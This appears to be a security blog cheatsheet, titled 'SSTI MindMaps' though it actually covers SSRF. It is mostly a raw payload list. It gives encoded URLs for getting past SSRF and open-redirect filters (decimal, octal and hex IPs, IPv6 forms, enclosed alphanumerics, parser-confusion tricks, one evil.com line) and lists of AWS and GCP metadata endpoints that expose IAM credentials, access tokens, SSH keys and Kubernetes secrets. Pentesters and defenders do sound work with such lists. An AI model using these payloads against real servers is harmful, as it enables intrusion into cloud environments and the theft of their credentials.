---
id: 177
title: SSTI MindMaps
date: 2014-07-17T13:42:42+00:00
author: abdilahrf
layout: post
category: cheatsheet
tags: [ssrf,openredirect]
---

###SSRF & Open Redirect Bypass

```
With [::], abuses IPv6 to exploit
http://[::]/
http://[::]:80/
http://0000::1/
http://0000::1:80/
With domain redirection, useful when all IP addresses are blacklisted
http://localtest.me
http://test.app.127.0.0.1.nip.io
http://test-app-127-0-0-1.nip.io
httP://test.app.127.0.0.1.xip.io
With CIDR, useful when just 127.0.0.1 is whitelisted
http://127.127.127.127/
http://127.0.1.3/
https:/127.0.0.0/
With IPv6/IPv4 address embedding, useful when both IPv4 and IPv6 are blacklisted (but blacklisted badly)
http://[0:0:0:0:0:ffff:127.0.0.1]/
With decimal IP location, really useful if dots are blacklisted
http://0177.0.0.1/ --> (127.0.0.1)
http://2130706433/ --> (127.0.0.1)
http://3232235521/ --> (192.168.0.1)
http://3232235777/ --> (192.168.1.1)
With malformed URLs, useful when port is blacklisted
localhost:+11211aaa
localhost:00011211aaaa
localhost:11211
With shorthanding IP addresses by dropping zeros, useful when full IP address is whitelisted
http://0/
http://127.1/
http://127.0.1/
With enclosed alphanumerics, useful when just plain ASCII characters are blacklisted but servers interpret enclosed alphanumerics as normal.
http://①②⑦.⓪.⓪.①/
http://⓵⓶⓻.⓪.⓪.⓵/
With bash variables (cURL only)
curl -v "http://attacker$google.com"; $google = ""
Against weak parsers (these go to http://127.2.2.2:80)
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
Bypass 169.254.169.254 address
The most common bypass for AWS addresses is changing them to get past the blacklist of 169.245.169.254.
http://169.254.169.254.xip.io/
http://1ynrnhl.xip.io
http://425.510.425.510 – dotted decimal with overflow
http://2852039166 – dotless decimal
http://7147006462 – dotless decimal with overflow
http://0xA9.0xFE.0xA9.0xFE – dotted hexadecimal
http://0xA9FEA9FE – dotless hexadecimal
http://0x41414141A9FEA9FE – dotless hexadecimal with overflow
http://0251.0376.0251.0376 – dotted octal
http://0251.00376.000251.0000376 – dotted octal with padding
http://2130706433/ 
http://[0:0:0:0:0:ffff:127.0.0.1]
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1
http://0.0.0.0:22
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://0000::1:80/
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
0://evil.com:80;http://google.com:80/
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http://169.254.169.254
http://metadata.nicob.net/
http://169.254.169.254.xip.io/
http://1ynrnhl.xip.io/
http://www.owasp.org.1ynrnhl.xip.io/
http://425.510.425.510/ Dotted decimal with overflow
http://2852039166/ Dotless decimal
http://7147006462/ Dotless decimal with overflow
http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal
http://0xA9FEA9FE/ Dotless hexadecimal
http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
http://0251.0376.0251.0376/ Dotted octal
http://0251.00376.000251.0000376/ Dotted octal with padding
http://whitelist-domain.internal_domain_or_ip/page
http://whitelist-domain@internal_domain_or_ip/page
http://internal_domain_or_ip#.whitelist-domain/page
http://internal_domain_or_ip?.whitelist-domain/page
http://internal_domain_or_ip\.whitelist-domain/page
https://ⓦⓦⓦ.ⓗⓐⓗⓦⓤⓛ.ⓒⓞⓜ = www.hahwul.com
https://whitelist-domain.hahwul.com
https://whitelist-domain@hahwul.com
https://www.example.com#whitelist-domain
https://www.example.com?whitelist-domain
https://www.example.com\whitelist-domain
https://www.example.com&whitelist-domain
http:///////////www.example.com
http:\\www.example.com
http:\/\/www.example.com
```

### METADATA 

```
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
http://169.254.169.254/latest/dynamic/instance-identity/document
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
SSH Public Key : http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
Get Access Token : http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
Kubernetes Key : http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### List Dotted Char

```
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```